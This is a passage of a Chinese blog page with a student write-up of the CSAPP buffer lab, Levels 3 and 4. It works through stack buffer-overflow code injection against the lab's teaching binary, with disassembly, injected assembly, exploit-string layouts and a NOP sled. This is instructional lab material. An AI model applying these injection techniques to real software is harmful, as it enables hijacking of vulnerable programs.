class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>	&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); <br>		validate(<span class="hljs-number">3</span>);<br>	&#125; <br>	<span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p><code>test</code>的汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function test:<br>   0x08048e3c &lt;+0&gt;:		push   %ebp<br>   0x08048e3d &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08048e3f &lt;+3&gt;:		push   %ebx<br>   0x08048e40 &lt;+4&gt;:		sub    $0x24,%esp<br>   0x08048e43 &lt;+7&gt;:		call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048e48 &lt;+12&gt;:	mov    %eax,-0xc(%ebp)<br>   0x08048e4b &lt;+15&gt;:	call   0x8049262 &lt;getbuf&gt;<br>   0x08048e50 &lt;+20&gt;:	mov    %eax,%ebx<br>   0x08048e52 &lt;+22&gt;:	call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048e57 &lt;+27&gt;:	mov    -0xc(%ebp),%edx<br>   0x08048e5a &lt;+30&gt;:	cmp    %edx,%eax<br>   0x08048e5c &lt;+32&gt;:	je     0x8048e74 &lt;test+56&gt;<br>   0x08048e5e &lt;+34&gt;:	movl   $0x804a460,0x4(%esp)<br>   0x08048e66 &lt;+42&gt;:	movl   $0x1,(%esp)<br>   0x08048e6d &lt;+49&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e72 &lt;+54&gt;:	jmp    0x8048eba &lt;test+126&gt;<br>   0x08048e74 &lt;+56&gt;:	cmp    0x804d104,%ebx<br>   0x08048e7a &lt;+62&gt;:	jne    0x8048ea2 &lt;test+102&gt;<br>   0x08048e7c &lt;+64&gt;:	mov    %ebx,0x8(%esp)<br>   0x08048e80 &lt;+68&gt;:	movl   $0x804a31a,0x4(%esp)<br>   0x08048e88 &lt;+76&gt;:	movl   $0x1,(%esp)<br>   0x08048e8f &lt;+83&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e94 &lt;+88&gt;:	movl   $0x3,(%esp)<br>   0x08048e9b &lt;+95&gt;:	call   0x8049280 &lt;validate&gt;<br>   0x08048ea0 &lt;+100&gt;:	jmp    0x8048eba &lt;test+126&gt;<br>   0x08048ea2 &lt;+102&gt;:	mov    %ebx,0x8(%esp)<br>   0x08048ea6 &lt;+106&gt;:	movl   $0x804a337,0x4(%esp)<br>   0x08048eae &lt;+114&gt;:	movl   $0x1,(%esp)<br>   0x08048eb5 &lt;+121&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048eba &lt;+126&gt;:	add    $0x24,%esp<br>   0x08048ebd &lt;+129&gt;:	pop    %ebx<br>   0x08048ebe &lt;+130&gt;:	pop    %ebp<br>   0x08048ebf &lt;+131&gt;:	ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="目标：-3"><a href="#目标：-3" class="headerlink" title="目标："></a>目标：</h4><p>​		提供一个漏洞字符串，该字符串将导致<code>getbuf</code>将<code>cookie</code>返回到<code>test</code>，而不是值1。可以在<code>test</code>的代码中看到，这将导致程序运行“Boom！”。</p>
+<p>​		漏洞字符串将<code>cookie</code>设置为返回值的同时，应恢复任何损坏的状态，在堆栈上设定正确的返回地址，并执行<code>ret</code>指令以真正返回<code>test</code>。</p>
+<h4 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h4><ul>
+<li><p><code>getbuf</code>的返回值保存在<code>eax</code>中，故注入的字符串应执行操作将getbuf中<code>eax</code>的值设为<code>cookie</code>的值。同时返回到<code>test</code>的<code>call   0x8049262 &lt;getbuf&gt;</code>之后的位置，同时注入<code>buf</code>时应让保存的旧<code>ebp</code>保持原值不变。</p>
+</li>
+<li><p>编写汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">mov		$0x20083f2f,%eax	/*将cookie的值保存在eax中*/<br>push	$0x08048e50			/*test的call &lt;getbuf&gt;之后的地址入栈*/<br>ret							/*返回*/<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>输入指令，反汇编得机器码如下，共11个字节：</p>
+<p><img src="/buflab/image-20210601193213300.png" srcset="/img/loading.gif" lazyload alt="image-20210601193213300"></p>
+<p><img src="/buflab/image-20210601201352918-1625461248265.png" srcset="/img/loading.gif" lazyload alt="image-20210601201352918"></p>
+</li>
+<li><p>我们可以把这段代码从<code>buf</code>的起始位置开始存放，而把<code>getbuf</code>的返回地址更改为<code>buf</code>的起始地址，以执行这段代码。与Level 2一样，<code>buf</code>的起始地址为：<code>0x556835b8</code>。</p>
+</li>
+<li><p>同时旧<code>ebp</code>应保持原值不变，调试查看得<code>getbuf</code>保存的<code>ebp</code>的值为<code>0x55683610</code></p>
+</li>
+</ul>
+<p><img src="/buflab/image-20210602084151289.png" srcset="/img/loading.gif" lazyload alt="image-20210602084151289"></p>
+<ul>
+<li><p>故更改后的<code>getbuf</code>的部分栈帧如下：</p>
+<p><img src="/buflab/image-20210601201240748.png" srcset="/img/loading.gif" lazyload alt="image-20210601201240748"></p>
+</li>
+<li><p>故注入的字符串为代码的字符编码（共11个字节）+29个字节（除了0x0a以外的任意字符）+<code>10 36 68 55</code>（原ebp的值，小端法表示）+<code>b8 35 68 55</code>（buf的起始地址的小端法表示）。txt文件如下：</p>
+<p><img src="/buflab/image-20210601201456344.png" srcset="/img/loading.gif" lazyload alt="image-20210601201456344"></p>
+</li>
+</ul>
+<h4 id="结果：-3"><a href="#结果：-3" class="headerlink" title="结果："></a>结果：</h4><p><img src="/buflab/image-20210601201603573.png" srcset="/img/loading.gif" lazyload alt="image-20210601201603573"></p>
+<h3 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin (10 pts)"></a>Level 4: Nitroglycerin (10 pts)</h3><p><code>testn</code>的汇编代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function testn:<br>   0x08048cce &lt;+0&gt;:		push   %ebp<br>   0x08048ccf &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08048cd1 &lt;+3&gt;:		push   %ebx<br>   0x08048cd2 &lt;+4&gt;:		sub    $0x24,%esp<br>   0x08048cd5 &lt;+7&gt;:		call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048cda &lt;+12&gt;:	mov    %eax,-0xc(%ebp)<br>   0x08048cdd &lt;+15&gt;:	call   0x8049244 &lt;getbufn&gt;<br>   0x08048ce2 &lt;+20&gt;:	mov    %eax,%ebx<br>   0x08048ce4 &lt;+22&gt;:	call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048ce9 &lt;+27&gt;:	mov    -0xc(%ebp),%edx<br>   0x08048cec &lt;+30&gt;:	cmp    %edx,%eax<br>   0x08048cee &lt;+32&gt;:	je     0x8048d06 &lt;testn+56&gt;<br>   0x08048cf0 &lt;+34&gt;:	movl   $0x804a460,0x4(%esp)<br>   0x08048cf8 &lt;+42&gt;:	movl   $0x1,(%esp)<br>   0x08048cff &lt;+49&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d04 &lt;+54&gt;:	jmp    0x8048d4c &lt;testn+126&gt;<br>   0x08048d06 &lt;+56&gt;:	cmp    0x804d104,%ebx<br>   0x08048d0c &lt;+62&gt;:	jne    0x8048d34 &lt;testn+102&gt;<br>   0x08048d0e &lt;+64&gt;:	mov    %ebx,0x8(%esp)<br>   0x08048d12 &lt;+68&gt;:	movl   $0x804a48c,0x4(%esp)<br>   0x08048d1a &lt;+76&gt;:	movl   $0x1,(%esp)<br>   0x08048d21 &lt;+83&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d26 &lt;+88&gt;:	movl   $0x4,(%esp)<br>   0x08048d2d &lt;+95&gt;:	call   0x8049280 &lt;validate&gt;<br>   0x08048d32 &lt;+100&gt;:	jmp    0x8048d4c &lt;testn+126&gt;<br>   0x08048d34 &lt;+102&gt;:	mov    %ebx,0x8(%esp)<br>   0x08048d38 &lt;+106&gt;:	movl   $0x804a2a6,0x4(%esp)<br>   0x08048d40 &lt;+114&gt;:	movl   $0x1,(%esp)<br>   0x08048d47 &lt;+121&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d4c &lt;+126&gt;:	add    $0x24,%esp<br>   0x08048d4f &lt;+129&gt;:	pop    %ebx<br>   0x08048d50 &lt;+130&gt;:	pop    %ebp<br>   0x08048d51 &lt;+131&gt;:	ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="目标：-4"><a href="#目标：-4" class="headerlink" title="目标："></a>目标：</h4><p>​		在Nitro模式下运行时，BUFBOMB要求提供字符串5次，它将执行<code>getbufn</code> 5次，每次都有不同的堆栈偏移量。</p>
+<p>​		与Level3相同，Level4要求提供一个漏洞字符串，该字符串将导致<code>getbufn</code>将<code>cookie</code>返回到<code>testn</code>，而不是值1。可以在<code>testn</code>的代码中看到，这将导致程序进入“KABOOM！”。攻击代码需要将<code>cookie</code>设置为返回值，同时应恢复任何损坏的状态，在堆栈上设定正确的返回地址，并执行<code>ret</code>指令以真正返回<code>testn</code>。</p>
+<h4 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h4><p><code>getbufn</code>的汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function getbufn:<br>   0x08049244 &lt;+0&gt;:		push   %ebp<br>   0x08049245 &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08049247 &lt;+3&gt;:		sub    $0x218,%esp<br>   0x0804924d &lt;+9&gt;:		lea    -0x208(%ebp),%eax		<br>   0x08049253 &lt;+15&gt;:	mov    %eax,(%esp)<br>   0x08049256 &lt;+18&gt;:	call   0x8048c32 &lt;Gets&gt;<br>   0x0804925b &lt;+23&gt;:	mov    $0x1,%eax<br>   0x08049260 &lt;+28&gt;:	leave  <br>   0x08049261 &lt;+29&gt;:	ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><p><code>ebp-0x208</code>的地址为<code>Gets()</code>函数的参数。<code>Gets()</code>将以该地址为起点向地址增大的方向保存字符。</p>
+</li>
+<li><p>通过调试，观察每次执行<code>testn</code>时的<code>ebp</code>，以及对应的<code>getbufn</code>的<code>ebp</code>的变化。</p>
+<p><img src="/buflab/image-20210602084724410.png" srcset="/img/loading.gif" lazyload alt="image-20210602084724410"><img src="/buflab/image-20210602084741390.png" srcset="/img/loading.gif" lazyload alt="image-20210602084741390"><img src="/buflab/image-20210602084801354.png" srcset="/img/loading.gif" lazyload alt="image-20210602084801354"><img src="/buflab/image-20210602084816623.png" srcset="/img/loading.gif" lazyload alt="image-20210602084816623"></p>
+<p><img src="/buflab/image-20210602084857133.png" srcset="/img/loading.gif" lazyload alt="image-20210602084857133"></p>
+</li>
+<li><p>观察到<code>testn</code>的<code>ebp</code>是变化的，最大值为<code>0x55683680</code>，最小值为<code>0x556835a0</code>，差值为0xE0（224）。<code>getbufn</code>的<code>ebp</code>同样是变化的，最大值为<code>0x55683650</code>，最小值为<code>0x55683570</code>。对应的<code>buf</code>起始地址最大值为<code>0x55683448</code>，最小值为<code>0x55683368</code>。由于我们注入的返回地址是固定的，故我们注入的返回地址须不小于<code>0x55683468</code>，否则可能出现<code>buf</code>覆盖的地址都大于设定的返回地址，从返回地址向高地址执行命令时执行了未知命令的情况。</p>
+</li>
+<li><p>类似于Level3，我们从更改后的返回地址开始执行指令。由于设定的返回地址不小于<code>0x55683448</code>，当<code>buf</code>的起始地址小于设定的返回地址时，就需要想办法使注入的攻击代码出现在返回地址的高处。我们就设定返回地址为<code>0x55683448</code>，则<code>buf</code>起始地址的最小值相差了224个字节，这就需要至少填充224个字节的nop指令（nop指令只使程序计数器加1），从而在任何情况下都能使CPU将指令至少执行到注入的攻击代码（若填充00，则CPU无法识别，无法进行后续操作）。</p>
+</li>
+<li><p>而<code>testn</code>的<code>ebp</code>是不断的变化的，无法像Level3一样在内存中注入固定的值恢复保存的<code>ebp</code>。但我们可以找到<code>getbufn</code>的<code>ebp</code>与<code>testn</code>的<code>ebp</code>的关系，即前者比后者小了<code>0x30</code>。我们的攻击代码是在<code>getbufn</code>的<code>leave</code>、<code>ret</code>指令之后执行的。在这两次指令后，<code>esp</code>的值变为<code>getbufn</code>的<code>ebp</code>+<code>0x8</code>，而本身的<code>ebp</code>变为保存的<code>ebp</code>的值（但被buf溢出覆盖）。故此时，我们可以根据这个关系：<code>testn</code>的<code>ebp</code>&#x3D;<code>esp</code>+<code>0x28</code>编写注入的代码。</p>
+</li>
+<li><p>注入的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">mov		$0x20083f2f,%eax	/*将cookie的值保存在eax中*/<br>lea		0x28(%esp),%ebp		/*恢复保存的ebp的值*/<br>push	$0x08048ce2			/*testn的call &lt;getbuf&gt;之后的地址入栈*/<br>ret							/*返回*/<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>输入指令，反汇编得机器码如下，共15个字节：</p>
+</li>
+</ul>
+<p><img src="/buflab/image-20210602090320808.png" srcset="/img/loading.gif" lazyload alt="image-20210602090320808"></p>
+<ul>
+<li><p>可以得到栈帧的示意图：</p>
+<p><img src="/buflab/image-20210602091128347.png" srcset="/img/loading.gif" lazyload alt="image-20210602091128347"></p>
+</li>
+<li><p><code>getbufn</code>的ebp-0x208为buf的起始地址，0x208为520。故注入的字符串为509个nop（0x90）+15个字节的攻击代码+<code>48 34 68 55</code>(修改的返回地址，小端法表示)。txt文件如下：</p>
+</li>
+</ul>
+<p><img src="/buflab/image-20210602091213381.png" srcset="/img/loading.gif" lazyload alt="image-20210602091213381"></p>
+<h4 id="结果：-4"><a href="#结果：-4" class="headerlink" title="结果："></a>结果：</h4><p><img src="/buflab/image-20210602091240597.png" srcset="/img/loading.gif" lazyload alt="image-20210602091240597"></p>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><ol>
+<li><p>这次实验的难度随级别的提高而增加，引导我们如何利用缓冲区存在的漏洞实现一些目的：</p>
+<p>Level0：利用直接覆盖返回地址，在调用函数getbuf时直接返回smoke函数，让我们初步认识缓冲区溢出攻击的原理。</p>
+<p>Level1：在Level0的基础上，多了修改函数参数的操作，这需要我们结合汇编代码找到参数的位置。</p>
+<p>Level2：开始需要我们自己编写汇编代码段去实现操作：修改返回值、设置全局变量、跳转。同时也需要利用缓冲区溢出，跳转至这段代码的起始地址。</p>
+<p>Level3：同时利用自己编写的代码设置返回值并返回至test函数，需要覆盖buf时要保持函数保存的旧ebp不变。</p>
+<p>Level4：每次调用getbufn的目的与Level3一致，不同的是它的ebp不断变化，需要找到等式关系去编写代码以修正而ebp。难点还在于多次调用使栈基址随机化，这需要利用弄nop_sled的技术。</p>
+<p>通过学习、理解如何实现缓冲区溢出攻击，我对函数调用、栈帧空间的分配、nop_sled的使用等相关知识有了更加深刻的理解。</p>
+</li>
+<li><p>在实验的部分地方需要对运行过程进行调试，查看某个寄存器的值及其变化。所以gdb工具的使用是不可或缺的。通过完成这次实验，我对gdb工具的使用更加熟练。</p>
+</li>
+<li><p>进行实验，细心和耐心也是很重要的品质。有时候会因为不够细心而耽误时间，如Level4中我因为看错了ebp的值，使得第一次尝试没有通过，但好在能够通过调试发现错误之处，并加以改正。有了细心和耐心的加持，才能更好地完成一个个实验，收获知识，提升技能。</p>
+</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">深入理解计算机系统</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">深入理解计算机系统</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CSAPP-LAB/">CSAPP-LAB</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均为博客作者本人编写整理，转载请联系作者！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">《深入理解计算机系统》第3版课本笔记（1—6章）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/01/bomblab/">
+                        <span class="hidden-mobile">CSAPP-bomblab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.4.17/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"hello-cloudbase-8gj7evx1e18b463f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.plugins.initFancyBox('#twikoo .tk-content img:not(.tk-owo-emotion)');
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="" target="_blank" rel="nofollow noopener"><span>Copyrights © 2021 Yuhan</span></a> <i class="iconfont icon-love"></i> <a href="" target="_blank" rel="nofollow noopener"><span>Xiayan</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        loader: {
+          
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://lib.baomitu.com/mathjax/3.2.0/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?6da93a2e5d7f160e0f40b273ddbbddac";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
